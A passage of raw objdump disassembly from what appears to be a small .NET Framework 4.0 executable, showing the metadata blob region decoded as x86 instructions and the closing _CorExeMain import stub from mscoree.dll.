  40c17e:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40c181:	00 07                	add    %al,(%edi)
  40c183:	31 2e                	xor    %ebp,(%esi)
  40c185:	30 2e                	xor    %ch,(%esi)
  40c187:	30 2e                	xor    %ch,(%esi)
  40c189:	30 00                	xor    %al,(%eax)
  40c18b:	00 65 01             	add    %ah,0x1(%ebp)
  40c18e:	00 29                	add    %ch,(%ecx)
  40c190:	2e 4e                	cs dec %esi
  40c192:	45                   	inc    %ebp
  40c193:	54                   	push   %esp
  40c194:	46                   	inc    %esi
  40c195:	72 61                	jb     0x40c1f8
  40c197:	6d                   	insl   (%dx),%es:(%edi)
  40c198:	65 77 6f             	gs ja  0x40c20a
  40c19b:	72 6b                	jb     0x40c208
  40c19d:	2c 56                	sub    $0x56,%al
  40c19f:	65 72 73             	gs jb  0x40c215
  40c1a2:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40c1a9:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40c1ac:	72 6f                	jb     0x40c21d
  40c1ae:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40c1b5:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40c1bc:	0e                   	push   %cs
  40c1bd:	14 46                	adc    $0x46,%al
  40c1bf:	72 61                	jb     0x40c222
  40c1c1:	6d                   	insl   (%dx),%es:(%edi)
  40c1c2:	65 77 6f             	gs ja  0x40c234
  40c1c5:	72 6b                	jb     0x40c232
  40c1c7:	44                   	inc    %esp
  40c1c8:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40c1cf:	61                   	popa
  40c1d0:	6d                   	insl   (%dx),%es:(%edi)
  40c1d1:	65 1f                	gs pop %ds
  40c1d3:	2e 4e                	cs dec %esi
  40c1d5:	45                   	inc    %ebp
  40c1d6:	54                   	push   %esp
  40c1d7:	20 46 72             	and    %al,0x72(%esi)
  40c1da:	61                   	popa
  40c1db:	6d                   	insl   (%dx),%es:(%edi)
  40c1dc:	65 77 6f             	gs ja  0x40c24e
  40c1df:	72 6b                	jb     0x40c24c
  40c1e1:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40c1e4:	43                   	inc    %ebx
  40c1e5:	6c                   	insb   (%dx),%es:(%edi)
  40c1e6:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40c1ed:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1ee:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40c1f5:	04 49                	add    $0x49,%al
  40c1f7:	74 65                	je     0x40c25e
  40c1f9:	6d                   	insl   (%dx),%es:(%edi)
  40c1fa:	00 00                	add    %al,(%eax)
  40c1fc:	03 07                	add    (%edi),%eax
  40c1fe:	01 08                	add    %ecx,(%eax)
  40c200:	04 00                	add    $0x0,%al
  40c202:	01 08                	add    %ecx,(%eax)
  40c204:	0e                   	push   %cs
  40c205:	03 07                	add    (%edi),%eax
  40c207:	01 02                	add    %eax,(%edx)
  40c209:	05 00 00 12 80       	add    $0x80120000,%eax
  40c20e:	b1 05                	mov    $0x5,%cl
  40c210:	20 01                	and    %al,(%ecx)
  40c212:	0e                   	push   %cs
  40c213:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40c218:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40c21e:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40c224:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40c229:	03 02                	add    (%edx),%eax
  40c22b:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40c230:	14 07                	adc    $0x7,%al
  40c232:	08 0e                	or     %cl,(%esi)
  40c234:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40c23a:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40c240:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40c246:	20 03                	and    %al,(%ebx)
  40c248:	01 11                	add    %edx,(%ecx)
  40c24a:	80 d5 11             	adc    $0x11,%ch
  40c24d:	80 d9 11             	sbb    $0x11,%cl
  40c250:	80 dd 05             	sbb    $0x5,%ch
  40c253:	00 02                	add    %al,(%edx)
  40c255:	02 0e                	add    (%esi),%cl
  40c257:	0e                   	push   %cs
  40c258:	06                   	push   %es
  40c259:	20 01                	and    %al,(%ecx)
  40c25b:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40c260:	20 01                	and    %al,(%ecx)
  40c262:	08 08                	or     %cl,(%eax)
  40c264:	07                   	pop    %es
  40c265:	00 01                	add    %al,(%ecx)
  40c267:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40c26c:	07                   	pop    %es
  40c26d:	20 02                	and    %al,(%edx)
  40c26f:	01 12                	add    %edx,(%edx)
  40c271:	80 c9 08             	or     $0x8,%cl
  40c274:	06                   	push   %es
  40c275:	20 01                	and    %al,(%ecx)
  40c277:	01 12                	add    %edx,(%edx)
  40c279:	80 f1 09             	xor    $0x9,%cl
  40c27c:	20 02                	and    %al,(%edx)
  40c27e:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40c283:	80 f5 05             	xor    $0x5,%ch
  40c286:	20 02                	and    %al,(%edx)
  40c288:	08 08                	or     %cl,(%eax)
  40c28a:	08 06                	or     %al,(%esi)
  40c28c:	20 02                	and    %al,(%edx)
  40c28e:	01 12                	add    %edx,(%edx)
  40c290:	0d 02 05 20 02       	or     $0x2200502,%eax
  40c295:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40c298:	09 20                	or     %esp,(%eax)
  40c29a:	03 01                	add    (%ecx),%eax
  40c29c:	12 61 02             	adc    0x2(%ecx),%ah
  40c29f:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40c2a5:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40c2ab:	01 0e                	add    %ecx,(%esi)
  40c2ad:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40c2b3:	02 09                	add    (%ecx),%cl
  40c2b5:	20 04 01             	and    %al,(%ecx,%eax,1)
  40c2b8:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40c2be:	0c 20                	or     $0x20,%al
  40c2c0:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40c2c5:	08 08                	or     %cl,(%eax)
  40c2c7:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40c2cd:	01 11                	add    %edx,(%ecx)
  40c2cf:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40c2d5:	02 12                	add    (%edx),%dl
  40c2d7:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40c2da:	02 08                	add    (%eax),%cl
  40c2dc:	08 05 20 01 08 12    	or     %al,0x12080120
  40c2e2:	25 06 00 02 08       	and    $0x8020006,%eax
  40c2e7:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40c2ec:	03 08                	add    (%eax),%ecx
  40c2ee:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40c2f3:	20 01                	and    %al,(%ecx)
  40c2f5:	01 12                	add    %edx,(%edx)
  40c2f7:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40c2fd:	1c 0c                	sbb    $0xc,%al
  40c2ff:	07                   	pop    %es
  40c300:	06                   	push   %es
  40c301:	1c 02                	sbb    $0x2,%al
  40c303:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40c308:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40c30e:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40c311:	02 07                	add    (%edi),%al
  40c313:	20 02                	and    %al,(%edx)
  40c315:	02 08                	add    (%eax),%cl
  40c317:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
  40c31d:	01 1d 05 08 08 1a    	add    %ebx,0x1a080805
  40c323:	07                   	pop    %es
  40c324:	0a 12                	or     (%edx),%dl
  40c326:	81 3d 0e 1d 12 81 41 	cmpl   $0x81120841,0x81121d0e
  40c32d:	08 12 81 
  40c330:	41                   	inc    %ecx
  40c331:	12 81 45 12 81 49    	adc    0x49811245(%ecx),%al
  40c337:	1d 05 0e 12 81       	sbb    $0x81120e05,%eax
  40c33c:	4d                   	dec    %ebp
  40c33d:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c342:	0e                   	push   %cs
  40c343:	05 00 00 12 81       	add    $0x81120000,%eax
  40c348:	41                   	inc    %ecx
  40c349:	05 20 00 12 81       	add    $0x81120020,%eax
  40c34e:	55                   	push   %ebp
  40c34f:	06                   	push   %es
  40c350:	00 00                	add    %al,(%eax)
  40c352:	1d 12 81 41 05       	sbb    $0x5418112,%eax
  40c357:	00 01                	add    %al,(%ecx)
  40c359:	0e                   	push   %cs
  40c35a:	1d 0e 06 20 01       	sbb    $0x120060e,%eax
  40c35f:	01 11                	add    %edx,(%ecx)
  40c361:	81 5d 08 00 01 12 81 	sbbl   $0x81120100,0x8(%ebp)
  40c368:	41                   	inc    %ecx
  40c369:	12 81 45 04 06 12    	adc    0x12060445(%ecx),%al
  40c36f:	81 49 09 20 02 12 81 	orl    $0x81120220,0x9(%ecx)
  40c376:	49                   	dec    %ecx
  40c377:	0e                   	push   %cs
  40c378:	11 81 69 06 00 03    	adc    %eax,0x3000669(%ecx)
  40c37e:	0e                   	push   %cs
  40c37f:	0e                   	push   %cs
  40c380:	0e                   	push   %cs
  40c381:	0e                   	push   %cs
  40c382:	05 20 02 01 0e       	add    $0xe010220,%eax
  40c387:	1c 07                	sbb    $0x7,%al
  40c389:	20 02                	and    %al,(%edx)
  40c38b:	01 0e                	add    %ecx,(%esi)
  40c38d:	11 81 75 04 07 02    	adc    %eax,0x2070475(%ecx)
  40c393:	0a 02                	or     (%edx),%al
  40c395:	10 07                	adc    %al,(%edi)
  40c397:	06                   	push   %es
  40c398:	12 81 85 12 81 89    	adc    -0x767eed7b(%ecx),%al
  40c39e:	12 81 8d 12 81 91    	adc    -0x6e7eed73(%ecx),%al
  40c3a4:	0e                   	push   %cs
  40c3a5:	02 05 20 00 12 81    	add    0x81120020,%al
  40c3ab:	89 05 20 00 12 81    	mov    %eax,0x81120020
  40c3b1:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40c3b7:	91                   	xchg   %eax,%ecx
  40c3b8:	04 20                	add    $0x20,%al
  40c3ba:	01 1c 0e             	add    %ebx,(%esi,%ecx,1)
  40c3bd:	04 07                	add    $0x7,%al
  40c3bf:	02 02                	add    (%edx),%al
  40c3c1:	02 03                	add    (%ebx),%al
  40c3c3:	20 00                	and    %al,(%eax)
  40c3c5:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40c3c8:	02 18                	add    (%eax),%bl
  40c3ca:	02 03                	add    (%ebx),%al
  40c3cc:	07                   	pop    %es
  40c3cd:	01 0e                	add    %ecx,(%esi)
  40c3cf:	05 00 00 12 81       	add    $0x81120000,%eax
  40c3d4:	9d                   	popf
  40c3d5:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40c3da:	1c 0a                	sbb    $0xa,%al
  40c3dc:	07                   	pop    %es
  40c3dd:	05 1d 05 12 35       	add    $0x3512051d,%eax
  40c3e2:	1d 05 08 05 05       	sbb    $0x5050805,%eax
  40c3e7:	20 01                	and    %al,(%ecx)
  40c3e9:	12 35 0e 05 20 02    	adc    0x220050e,%dh
  40c3ef:	0e                   	push   %cs
  40c3f0:	08 08                	or     %cl,(%eax)
  40c3f2:	06                   	push   %es
  40c3f3:	07                   	pop    %es
  40c3f4:	02 02                	add    (%edx),%al
  40c3f6:	11 81 ad 05 20 02    	adc    %eax,0x22005ad(%ecx)
  40c3fc:	0e                   	push   %cs
  40c3fd:	0e                   	push   %cs
  40c3fe:	0e                   	push   %cs
  40c3ff:	05 20 00 11 81       	add    $0x81110020,%eax
  40c404:	ad                   	lods   %ds:(%esi),%eax
  40c405:	05 00 00 12 81       	add    $0x81120000,%eax
  40c40a:	b9 06 20 01 01       	mov    $0x1012006,%ecx
  40c40f:	12 81 b9 06 20 01    	adc    0x12006b9(%ecx),%al
  40c415:	02 11                	add    (%ecx),%dl
  40c417:	81 c1 11 07 05 12    	add    $0x12050711,%ecx
  40c41d:	81 85 15 12 41 01 0e 	addl   $0x8d81120e,0x1411215(%ebp)
  40c424:	12 81 8d 
  40c427:	12 81 91 0e 05 15    	adc    0x15050e91(%ecx),%al
  40c42d:	12 41 01             	adc    0x1(%ecx),%al
  40c430:	0e                   	push   %cs
  40c431:	05 20 01 01 13       	add    $0x13010120,%eax
  40c436:	00 05 20 00 1d 13    	add    %al,0x131d0020
  40c43c:	00 06                	add    %al,(%esi)
  40c43e:	00 02                	add    %al,(%edx)
  40c440:	0e                   	push   %cs
  40c441:	0e                   	push   %cs
  40c442:	1d 0e 08 07 03       	sbb    $0x307080e,%eax
  40c447:	1d 12 29 08 12       	sbb    $0x12082912,%eax
  40c44c:	29 05 00 00 1d 12    	sub    %eax,0x121d0000
  40c452:	29 05 20 00 11 81    	sub    %eax,0x81110020
  40c458:	c5 09                	lds    (%ecx),%ecx
  40c45a:	00 02                	add    %al,(%edx)
  40c45c:	02 11                	add    (%ecx),%dl
  40c45e:	81 c5 11 81 c5 05    	add    $0x5c58111,%ebp
  40c464:	07                   	pop    %es
  40c465:	02 12                	add    (%edx),%dl
  40c467:	35 0e 07 20 03       	xor    $0x320070e,%eax
  40c46c:	01 02                	add    %eax,(%edx)
  40c46e:	0e                   	push   %cs
  40c46f:	10 02                	adc    %al,(%edx)
  40c471:	06                   	push   %es
  40c472:	00 01                	add    %al,(%ecx)
  40c474:	01 12                	add    %edx,(%edx)
  40c476:	81 cd 06 07 02 12    	or     $0x12020706,%ebp
  40c47c:	81 49 02 08 20 03 01 	orl    $0x1032008,0x2(%ecx)
  40c483:	0e                   	push   %cs
  40c484:	1c 11                	sbb    $0x11,%al
  40c486:	81 d5 07 07 02 12    	adc    $0x12020707,%ebp
  40c48c:	81 49 1d 05 06 20 01 	orl    $0x1200605,0x1d(%ecx)
  40c493:	12 81 49 0e 02 1d    	adc    0x1d020e49(%ecx),%al
  40c499:	05 07 20 02 12       	add    $0x12022007,%eax
  40c49e:	81 49 0e 02 0e 07 04 	orl    $0x4070e02,0xe(%ecx)
  40c4a5:	12 60 0e             	adc    0xe(%eax),%ah
  40c4a8:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c4ad:	12 60 12             	adc    0x12(%eax),%ah
  40c4b0:	60                   	pusha
  40c4b1:	06                   	push   %es
  40c4b2:	15 12 41 01 12       	adc    $0x12014112,%eax
  40c4b7:	60                   	pusha
  40c4b8:	10 10                	adc    %dl,(%eax)
  40c4ba:	01 01                	add    %eax,(%ecx)
  40c4bc:	15 12 41 01 1e       	adc    $0x1e014112,%eax
  40c4c1:	00 15 12 81 e1 01    	add    %dl,0x1e18112
  40c4c7:	1e                   	push   %ds
  40c4c8:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c4cb:	01 12                	add    %edx,(%edx)
  40c4cd:	60                   	pusha
  40c4ce:	09 20                	or     %esp,(%eax)
  40c4d0:	00 15 11 81 d9 01    	add    %dl,0x1d98111
  40c4d6:	13 00                	adc    (%eax),%eax
  40c4d8:	07                   	pop    %es
  40c4d9:	15 11 81 d9 01       	adc    $0x1d98111,%eax
  40c4de:	12 60 04             	adc    0x4(%eax),%ah
  40c4e1:	20 00                	and    %al,(%eax)
  40c4e3:	13 00                	adc    (%eax),%eax
  40c4e5:	05 20 01 02 13       	add    $0x13020120,%eax
  40c4ea:	00 03                	add    %al,(%ebx)
  40c4ec:	07                   	pop    %es
  40c4ed:	01 1c 05 00 00 12 81 	add    %ebx,-0x7eee0000(,%eax,1)
  40c4f4:	e5 07                	in     $0x7,%eax
  40c4f6:	20 01                	and    %al,(%ecx)
  40c4f8:	12 81 e9 1d 05 06    	adc    0x6051de9(%ecx),%al
  40c4fe:	20 01                	and    %al,(%ecx)
  40c500:	12 81 ed 0e 06 00    	adc    0x60eed(%ecx),%al
  40c506:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40c509:	81 ed 08 00 01 12    	sub    $0x12010008,%ebp
  40c50f:	81 ed 11 81 f5 09    	sub    $0x9f58111,%ebp
  40c515:	00 02                	add    %al,(%edx)
  40c517:	12 81 f9 11 81 fd    	adc    -0x27eee07(%ecx),%al
  40c51d:	0e                   	push   %cs
  40c51e:	1c 00                	sbb    $0x0,%al
  40c520:	05 12 82 05 11       	add    $0x11058212,%eax
  40c525:	82 09 0e             	orb    $0xe,(%ecx)
  40c528:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c52d:	12 81 ed 12 81 ed    	adc    -0x127eed13(%ecx),%al
  40c533:	15 12 81 e1 01       	adc    $0x1e18112,%eax
  40c538:	12 81 f9 17 15 12    	adc    0x121517f9(%ecx),%al
  40c53e:	45                   	inc    %ebp
  40c53f:	01 15 12 49 0a 12    	add    %edx,0x120a4912
  40c545:	4d                   	dec    %ebp
  40c546:	1c 12                	sbb    $0x12,%al
  40c548:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c54d:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c552:	0e                   	push   %cs
  40c553:	0b 00                	or     (%eax),%eax
  40c555:	01 15 12 45 01 13    	add    %edx,0x13014512
  40c55b:	00 12                	add    %dl,(%edx)
  40c55d:	82 05 03 06 13 00 13 	addb   $0x13,0x130603
  40c564:	15 12 49 0a 12       	adc    $0x120a4912,%eax
  40c569:	4d                   	dec    %ebp
  40c56a:	1c 12                	sbb    $0x12,%al
  40c56c:	0d 12 09 0e 1d       	or     $0x1d0e0912,%eax
  40c571:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40c576:	0e                   	push   %cs
  40c577:	17                   	pop    %ss
  40c578:	20 0a                	and    %cl,(%edx)
  40c57a:	01 13                	add    %edx,(%ebx)
  40c57c:	00 13                	add    %dl,(%ebx)
  40c57e:	01 13                	add    %edx,(%ebx)
  40c580:	02 13                	add    (%ebx),%dl
  40c582:	03 13                	add    (%ebx),%edx
  40c584:	04 13                	add    $0x13,%al
  40c586:	05 13 06 13 07       	add    $0x7130613,%eax
  40c58b:	13 08                	adc    (%eax),%ecx
  40c58d:	13 09                	adc    (%ecx),%ecx
  40c58f:	05 07 01 12 82       	add    $0x82120107,%eax
  40c594:	0d 07 20 03 01       	or     $0x1032007,%eax
  40c599:	0e                   	push   %cs
  40c59a:	1d 05 08 05 20       	sbb    $0x20050805,%eax
  40c59f:	01 1d 05 08 12 07    	add    %ebx,0x7120805
  40c5a5:	06                   	push   %es
  40c5a6:	12 81 2d 12 82 19    	adc    0x1982122d(%ecx),%al
  40c5ac:	12 82 1d 12 82 21    	adc    0x2182121d(%edx),%al
  40c5b2:	1d 05 1d 05 06       	sbb    $0x6051d05,%eax
  40c5b7:	20 01                	and    %al,(%ecx)
  40c5b9:	01 11                	add    %edx,(%ecx)
  40c5bb:	82 2d 06 20 01 01 11 	subb   $0x11,0x1012006
  40c5c2:	82 31 05             	xorb   $0x5,(%ecx)
  40c5c5:	20 00                	and    %al,(%eax)
  40c5c7:	12 82 35 0b 20 03    	adc    0x3200b35(%edx),%al
  40c5cd:	01 12                	add    %edx,(%edx)
  40c5cf:	61                   	popa
  40c5d0:	12 82 35 11 82 39    	adc    0x39821135(%edx),%al
  40c5d6:	08 20                	or     %ah,(%eax)
  40c5d8:	03 1d 05 1d 05 08    	add    0x8051d05,%ebx
  40c5de:	08 1a                	or     %bl,(%edx)
  40c5e0:	07                   	pop    %es
  40c5e1:	0a 12                	or     (%edx),%dl
  40c5e3:	81 2d 12 82 19 12 82 	subl   $0x51d2182,0x12198212
  40c5ea:	21 1d 05 
  40c5ed:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  40c5f2:	82 1d 1d 05 1d 05 1d 	sbbb   $0x1d,0x51d051d
  40c5f9:	05 0c 00 05 01       	add    $0x105000c,%eax
  40c5fe:	12 82 45 08 12 82    	adc    -0x7dedf7bb(%edx),%al
  40c604:	45                   	inc    %ebp
  40c605:	08 08                	or     %cl,(%eax)
  40c607:	04 07                	add    $0x7,%al
  40c609:	02 02                	add    (%edx),%al
  40c60b:	08 09                	or     %cl,(%ecx)
  40c60d:	00 02                	add    %al,(%edx)
  40c60f:	01 12                	add    %edx,(%edx)
  40c611:	82 45 11 82          	addb   $0x82,0x11(%ebp)
  40c615:	4d                   	dec    %ebp
  40c616:	0d 07 06 1d 05       	or     $0x51d0607,%eax
  40c61b:	12 82 51 12 35 1d    	adc    0x1d351251(%edx),%al
  40c621:	05 08 05 07 07       	add    $0x7070508,%eax
  40c626:	02 12                	add    (%edx),%dl
  40c628:	82 51 1d 05          	adcb   $0x5,0x1d(%ecx)
  40c62c:	08 07                	or     %al,(%edi)
  40c62e:	04 12                	add    $0x12,%al
  40c630:	35 1d 05 08 05       	xor    $0x508051d,%eax
  40c635:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40c63a:	1c 06                	sbb    $0x6,%al
  40c63c:	07                   	pop    %es
  40c63d:	03 1d 05 08 08 05    	add    0x5080805,%ebx
  40c643:	20 01                	and    %al,(%ecx)
  40c645:	13 00                	adc    (%eax),%eax
  40c647:	08 04 07             	or     %al,(%edi,%eax,1)
  40c64a:	01 12                	add    %edx,(%edx)
  40c64c:	60                   	pusha
  40c64d:	0e                   	push   %cs
  40c64e:	07                   	pop    %es
  40c64f:	05 08 08 0e 15       	add    $0x150e0808,%eax
  40c654:	11 81 d9 01 12 60    	adc    %eax,0x601201d9(%ecx)
  40c65a:	12 60 07             	adc    0x7(%eax),%ah
  40c65d:	07                   	pop    %es
  40c65e:	04 08                	add    $0x8,%al
  40c660:	05 1d 05 08 04       	add    $0x408051d,%eax
  40c665:	20 01                	and    %al,(%ecx)
  40c667:	01 05 04 07 01 11    	add    %eax,0x11010704
  40c66d:	64 04 00             	fs add $0x0,%al
  40c670:	01 0b                	add    %ecx,(%ebx)
  40c672:	0a 04 00             	or     (%eax,%eax,1),%al
  40c675:	01 0b                	add    %ecx,(%ebx)
  40c677:	0e                   	push   %cs
  40c678:	04 00                	add    $0x0,%al
  40c67a:	01 0b                	add    %ecx,(%ebx)
  40c67c:	0d 04 00 01 0b       	or     $0xb010004,%eax
  40c681:	0c 06                	or     $0x6,%al
  40c683:	00 01                	add    %al,(%ecx)
  40c685:	0b 11                	or     (%ecx),%edx
  40c687:	81 ad 04 00 01 0a 0a 	subl   $0x100040a,0xa010004(%ebp)
  40c68e:	04 00 01 
  40c691:	0a 0e                	or     (%esi),%cl
  40c693:	04 00                	add    $0x0,%al
  40c695:	01 0a                	add    %ecx,(%edx)
  40c697:	0d 04 00 01 0a       	or     $0xa010004,%eax
  40c69c:	0c 06                	or     $0x6,%al
  40c69e:	00 01                	add    %al,(%ecx)
  40c6a0:	0a 11                	or     (%ecx),%dl
  40c6a2:	81 ad 04 00 01 0d 0a 	subl   $0x100040a,0xd010004(%ebp)
  40c6a9:	04 00 01 
  40c6ac:	0d 0e 07 07 02       	or     $0x207070e,%eax
  40c6b1:	11 64 11 81          	adc    %esp,-0x7f(%ecx,%edx,1)
  40c6b5:	ad                   	lods   %ds:(%esi),%eax
  40c6b6:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40c6bb:	0c 07                	or     $0x7,%al
  40c6bd:	07                   	pop    %es
  40c6be:	02 1d 05 12 81 71    	add    0x71811205,%bl
  40c6c4:	0d 20 04 01 0e       	or     $0xe010420,%eax
  40c6c9:	11 81 75 11 82 61    	adc    %eax,0x61821175(%ecx)
  40c6cf:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40c6d5:	12 60 1d             	adc    0x1d(%eax),%ah
  40c6d8:	0e                   	push   %cs
  40c6d9:	0e                   	push   %cs
  40c6da:	08 12                	or     %dl,(%edx)
  40c6dc:	60                   	pusha
  40c6dd:	08 05 07 01 12 81    	or     %al,0x81120107
  40c6e3:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40c6e8:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40c6ef:	05 08 08 06 00       	add    $0x60808,%eax
  40c6f4:	02 07                	add    (%edi),%al
  40c6f6:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c6fb:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40c702:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40c708:	00 02                	add    %al,(%edx)
  40c70a:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40c710:	02 0b                	add    (%ebx),%cl
  40c712:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c717:	02 06                	add    (%esi),%al
  40c719:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40c71e:	02 0a                	add    (%edx),%cl
  40c720:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40c725:	03 12                	add    (%edx),%edx
  40c727:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40c72e:	07 02 12 
  40c731:	60                   	pusha
  40c732:	02 04 07             	add    (%edi,%eax,1),%al
  40c735:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40c73b:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40c740:	04 1d                	add    $0x1d,%al
  40c742:	05 1d 05 08 05       	add    $0x508051d,%eax
  40c747:	06                   	push   %es
  40c748:	07                   	pop    %es
  40c749:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40c74f:	00 01                	add    %al,(%ecx)
  40c751:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40c756:	06                   	push   %es
  40c757:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40c75d:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40c763:	05 08 20 02 01       	add    $0x1022008,%eax
  40c768:	12 61 11             	adc    0x11(%ecx),%ah
  40c76b:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40c76f:	04 12                	add    $0x12,%al
  40c771:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40c778:	1d 05 00 
  40c77b:	00 a4 c7 00 00 00 00 	add    %ah,0x0(%edi,%eax,8)
  40c782:	00 00                	add    %al,(%eax)
  40c784:	00 00                	add    %al,(%eax)
  40c786:	00 00                	add    %al,(%eax)
  40c788:	be c7 00 00 00       	mov    $0xc7,%esi
  40c78d:	20 00                	and    %al,(%eax)
	...
  40c7a3:	00 b0 c7 00 00 00    	add    %dh,0xc7(%eax)
	...
  40c7b1:	00 5f 43             	add    %bl,0x43(%edi)
  40c7b4:	6f                   	outsl  %ds:(%esi),(%dx)
  40c7b5:	72 45                	jb     0x40c7fc
  40c7b7:	78 65                	js     0x40c81e
  40c7b9:	4d                   	dec    %ebp
  40c7ba:	61                   	popa
  40c7bb:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40c7c2:	72 65                	jb     0x40c829
  40c7c4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40c7c8:	6c                   	insb   (%dx),%es:(%edi)
  40c7c9:	00 00                	add    %al,(%eax)
  40c7cb:	00 00                	add    %al,(%eax)
  40c7cd:	00 ff                	add    %bh,%bh
  40c7cf:	25 00 20 40 00       	and    $0x402000,%eax
